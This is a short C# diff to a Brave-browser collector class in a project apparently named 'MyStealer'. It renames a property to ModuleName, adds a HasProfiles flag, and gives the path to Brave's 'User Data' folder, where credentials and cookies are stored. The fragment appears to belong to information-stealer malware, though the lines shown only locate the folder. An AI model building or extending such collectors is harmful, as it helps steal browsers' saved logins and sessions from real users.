@@ -5,7 +5,9 @@ namespace MyStealer.Collectors.Browser.ChromiumBased
 {
     internal class Brave : Chromium
     {
-        public override string ApplicationName => "Brave";
+        public override string ModuleName => "Brave";
+
+        public override bool HasProfiles => false;
 
         protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "BraveSoftware", "Brave-Browser", "User Data");
     }
